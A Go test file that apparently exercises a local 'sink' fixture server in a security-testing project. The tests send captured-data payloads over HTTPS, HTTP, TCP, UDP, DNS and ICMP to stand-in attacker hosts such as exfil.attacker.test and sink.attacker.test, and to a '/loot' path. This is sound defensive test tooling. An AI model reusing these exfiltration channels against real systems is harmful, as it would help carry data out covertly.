// Copyright 2026 The Countersign Authors
// SPDX-License-Identifier: Apache-2.0

//go:build fixtures

package sink

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/countersign/countersign/test/fixtures/fxlib"
	"github.com/countersign/countersign/test/fixtures/fxtest"
)

func startSink(t *testing.T, env *fxtest.Env) *Server {
	t.Helper()
	s := New()
	cert := env.Issue("evil.example.com", "sink.attacker.test", "127.0.0.1")
	if err := s.Start(env.Ctx, cert, map[string]string{}); err != nil {
		t.Fatalf("sink start: %v", err)
	}
	env.Register("sink", s.Addr(LHTTPS))
	return s
}

// obsBytes finds the recorded bytes of a captured observation matching sha.
func obsBytes(obs []fxlib.Observation, listener, sha string) ([]byte, bool) {
	for _, o := range obs {
		if o.Listener == listener && o.BodySHA == sha {
			b, _ := base64.StdEncoding.DecodeString(o.BodyB64)
			return b, true
		}
	}
	return nil, false
}

func TestC031Sink(t *testing.T) {
	env := fxtest.NewEnv(t)
	s := startSink(t, env)
	base := "https://" + s.Addr(LHTTPS)

	// HTTPS listener: a TLS request lands and is recorded.
	tlsClient := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{RootCAs: env.CA.Pool()}}}
	res, err := tlsClient.Post(base+"/loot", "application/octet-stream", bytes.NewReader([]byte("captured-https")))
	if err != nil {
		t.Fatalf("https post: %v", err)
	}
	_ = res.Body.Close()

	// HTTP listener: plain HTTP works.
	hres, err := http.Post("http://"+s.Addr(LHTTP)+"/loot", "text/plain", strings.NewReader("captured-http"))
	if err != nil {
		t.Fatalf("http post: %v", err)
	}
	_ = hres.Body.Close()

	// Observations carry listener, source and bytes.
	deadline := time.Now().Add(3 * time.Second)
	for {
		obs := env.Observed(base)
		var hOK, pOK bool
		for _, o := range obs {
			if o.Listener == LHTTPS && o.Proto == "https" {
				hOK = true
			}
			if o.Listener == LHTTP && o.Proto == "http" {
				pOK = true
			}
		}
		if hOK && pOK {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("missing observations (https=%v http=%v)", hOK, pOK)
		}
		time.Sleep(20 * time.Millisecond)
	}
}

// TestC032SinkExactBytes sends distinctive payloads over all six listeners and
// verifies the recorded bytes are exactly what was sent.
func TestC032SinkExactBytes(t *testing.T) {
	env := fxtest.NewEnv(t)
	s := startSink(t, env)
	base := "https://" + s.Addr(LHTTPS)

	type shot struct {
		listener string
		payload  []byte
	}
	var shots []shot

	// HTTPS.
	p := []byte("exact-bytes-https-\x00\x01\x02")
	tlsClient := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{RootCAs: env.CA.Pool()}}}
	res, err := tlsClient.Post(base+"/x", "application/octet-stream", bytes.NewReader(p))
	if err != nil {
		t.Fatalf("https post: %v", err)
	}
	_ = res.Body.Close()
	// The request line is prepended; the payload must appear verbatim.
	shots = append(shots, shot{LHTTPS, append(requestLineBytes(http.MethodPost, "/x"), p...)})

	// HTTP.
	p2 := []byte("exact-bytes-http-\xFE\xFF")
	hres, err := http.Post("http://"+s.Addr(LHTTP)+"/y", "application/octet-stream", bytes.NewReader(p2))
	if err != nil {
		t.Fatalf("http post: %v", err)
	}
	_ = hres.Body.Close()
	shots = append(shots, shot{LHTTP, append(requestLineBytes(http.MethodPost, "/y"), p2...)})

	// Raw TCP.
	tcpPayload := []byte("exact-bytes-tcp-PING-\x03\x04")
	c, err := net.Dial("tcp", s.Addr(LTCP))
	if err != nil {
		t.Fatalf("tcp dial: %v", err)
	}
	_, _ = c.Write(tcpPayload)
	buf := make([]byte, 8)
	_ = c.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, _ = c.Read(buf)
	_ = c.Close()
	shots = append(shots, shot{LTCP, tcpPayload})

	// UDP.
	udpPayload := []byte("exact-bytes-udp-\x05\x06\x07")
	ua, _ := net.ResolveUDPAddr("udp", s.Addr(LUDP))
	uc, err := net.DialUDP("udp", nil, ua)
	if err != nil {
		t.Fatalf("udp dial: %v", err)
	}
	_, _ = uc.Write(udpPayload)
	_ = uc.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, _ = uc.Read(buf)
	_ = uc.Close()
	shots = append(shots, shot{LUDP, udpPayload})

	// DNS over UDP: build a query for exfil.attacker.test.
	dnsQ := dnsQuery(0xBEEF, "exfil.attacker.test")
	ua2, _ := net.ResolveUDPAddr("udp", s.Addr(LDNSU))
	ud, err := net.DialUDP("udp", nil, ua2)
	if err != nil {
		t.Fatalf("dns udp dial: %v", err)
	}
	_, _ = ud.Write(dnsQ)
	_ = ud.SetReadDeadline(time.Now().Add(2 * time.Second))
	rbuf := make([]byte, 512)
	n, _ := ud.Read(rbuf)
	_ = ud.Close()
	if n == 0 {
		t.Fatal("dns udp: no answer")
	}
	if a := dnsAnswerA(rbuf[:n]); a != "10.66.66.66" {
		t.Fatalf("dns udp answer %q, want 10.66.66.66", a)
	}
	shots = append(shots, shot{LDNSU, dnsQ})

	// DNS over TCP.
	dnsQ2 := dnsQuery(0xCAFE, "loot.attacker.test")
	dc, err := net.Dial("tcp", s.Addr(LDNST))
	if err != nil {
		t.Fatalf("dns tcp dial: %v", err)
	}
	var lb [2]byte
	binary.BigEndian.PutUint16(lb[:], uint16(len(dnsQ2)))
	_, _ = dc.Write(lb[:])
	_, _ = dc.Write(dnsQ2)
	_ = dc.SetReadDeadline(time.Now().Add(2 * time.Second))
	var rl [2]byte
	_, _ = io.ReadFull(dc, rl[:])
	resp := make([]byte, binary.BigEndian.Uint16(rl[:]))
	_, _ = io.ReadFull(dc, resp)
	_ = dc.Close()
	if a := dnsAnswerA(resp); a != "10.66.66.66" {
		t.Fatalf("dns tcp answer %q, want 10.66.66.66", a)
	}
	shots = append(shots, shot{LDNST, dnsQ2})

	// ICMP: needs CAP_NET_RAW. If the listener is down the check is reported
	// SKIPPED-ENV by the suite (grep for the marker below).
	icmpOK := true
	for _, e := range s.Errors() {
		if strings.Contains(e.Error(), "icmp") {
			icmpOK = false
		}
	}
	var icmpPayload []byte
	if icmpOK {
		icmpPayload = icmpEcho(0x1234, []byte("exact-bytes-icmp"))
		pc, err := net.Dial("ip4:icmp", "127.0.0.1")
		if err != nil {
			icmpOK = false
		} else {
			_ = pc.SetDeadline(time.Now().Add(2 * time.Second))
			if _, err := pc.Write(icmpPayload); err != nil {
				icmpOK = false
			} else {
				shots = append(shots, shot{LICMP, icmpPayload})
			}
			_ = pc.Close()
		}
	}
	if !icmpOK {
		fmt.Println("CS-ICMP-SKIPPED-ENV: icmp listener unavailable (no CAP_NET_RAW)")
	}

	// Wait for every listener's capture, then compare exact bytes.
	deadline := time.Now().Add(5 * time.Second)
	for {
		obs := env.Observed(base)
		missing := false
		for _, sh := range shots {
			sha := digest(sh.payload)
			if _, ok := obsBytes(obs, sh.listener, sha); !ok {
				// HTTP listeners prepend the request line; compare full bytes.
				if sh.listener == LHTTPS || sh.listener == LHTTP {
					if !obsContains(obs, sh.listener, sh.payload) {
						missing = true
					}
					continue
				}
				missing = true
			}
		}
		if !missing {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("missing exact-byte captures: %v", summarize(obs))
		}
		time.Sleep(25 * time.Millisecond)
	}
}

func TestC035StateSink(t *testing.T) {
	env := fxtest.NewEnv(t)
	s := startSink(t, env)
	base := "https://" + s.Addr(LHTTPS)

	before := env.RequireStateStable(base)
	// Admin reads don't change state.
	env.Observed(base)
	if got := env.State(base); got != before {
		t.Fatal("__state changed after __observed read")
	}
	// A write (UDP datagram) changes it.
	ua, _ := net.ResolveUDPAddr("udp", s.Addr(LUDP))
	uc, _ := net.DialUDP("udp", nil, ua)
	_, _ = uc.Write([]byte("state-write"))
	_ = uc.Close()
	waitForStateChange(t, env, base, before)
	env.Reset(base)
	if got := env.State(base); got != before {
		t.Fatal("__reset did not restore state")
	}
}

// --- helpers -----------------------------------------------------------------

func requestLineBytes(method, path string) []byte {
	return []byte(fmt.Sprintf("%s %s %s\r\n", method, path, "HTTP/1.1"))
}

func digest(b []byte) string {
	return fxlib.DigestBytes(b)
}

func obsContains(obs []fxlib.Observation, listener string, payload []byte) bool {
	for _, o := range obs {
		if o.Listener != listener {
			continue
		}
		b, _ := base64.StdEncoding.DecodeString(o.BodyB64)
		if bytes.Contains(b, payload) {
			return true
		}
	}
	return false
}

func summarize(obs []fxlib.Observation) string {
	var parts []string
	for _, o := range obs {
		parts = append(parts, fmt.Sprintf("%s:%dB", o.Listener, o.BodyLen))
	}
	return strings.Join(parts, ",")
}

func waitForStateChange(t *testing.T, env *fxtest.Env, base, before string) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		if env.State(base) != before {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatal("__state did not change after write")
}

// dnsQuery builds a minimal A-record query.
func dnsQuery(id uint16, name string) []byte {
	var b bytes.Buffer
	_ = binary.Write(&b, binary.BigEndian, id)
	_ = binary.Write(&b, binary.BigEndian, uint16(0x0100)) // RD
	_ = binary.Write(&b, binary.BigEndian, uint16(1))      // QDCOUNT
	_ = binary.Write(&b, binary.BigEndian, uint16(0))
	_ = binary.Write(&b, binary.BigEndian, uint16(0))
	_ = binary.Write(&b, binary.BigEndian, uint16(0))
	for _, label := range strings.Split(name, ".") {
		b.WriteByte(byte(len(label)))
		b.WriteString(label)
	}
	b.WriteByte(0)
	_ = binary.Write(&b, binary.BigEndian, uint16(1)) // A
	_ = binary.Write(&b, binary.BigEndian, uint16(1)) // IN
	return b.Bytes()
}

// dnsAnswerA extracts the first A record's dotted quad from a response.
func dnsAnswerA(resp []byte) string {
	// Answer RRs start after header (12) + question section. Walk past the
	// question name, then qtype/qclass, then the answer name (likely a
	// compression pointer), type/class/ttl/rdlength, and read 4 bytes.
	if len(resp) < 12 {
		return ""
	}
	i := 12
	for i < len(resp) && resp[i] != 0 {
		if resp[i]&0xC0 == 0xC0 {
			i += 2
			goto qdone
		}
		i += 1 + int(resp[i])
	}
	i++
qdone:
	i += 4 // qtype+qclass
	if i+2 > len(resp) || resp[i]&0xC0 != 0xC0 {
		return ""
	}
	i += 2 + 8 // name ptr + type/class/ttl
	if i+2 > len(resp) {
		return ""
	}
	rdl := int(binary.BigEndian.Uint16(resp[i:]))
	i += 2
	if rdl != 4 || i+4 > len(resp) {
		return ""
	}
	return fmt.Sprintf("%d.%d.%d.%d", resp[i], resp[i+1], resp[i+2], resp[i+3])
}

// icmpEcho builds an ICMPv4 echo request with a (zero) checksum — the sink
// records bytes verbatim; the local stack may or may not deliver it.
func icmpEcho(seq uint16, payload []byte) []byte {
	var b bytes.Buffer
	b.Write([]byte{8, 0, 0, 0}) // echo request, code 0, checksum (filled below)
	_ = binary.Write(&b, binary.BigEndian, uint16(0xBEEF))
	_ = binary.Write(&b, binary.BigEndian, seq)
	b.Write(payload)
	raw := b.Bytes()
	var sum uint32
	for i := 0; i+1 < len(raw); i += 2 {
		sum += uint32(raw[i])<<8 | uint32(raw[i+1])
	}
	sum = (sum >> 16) + (sum & 0xFFFF)
	sum += sum >> 16
	cs := ^uint16(sum)
	raw[2] = byte(cs >> 8)
	raw[3] = byte(cs)
	return raw
}
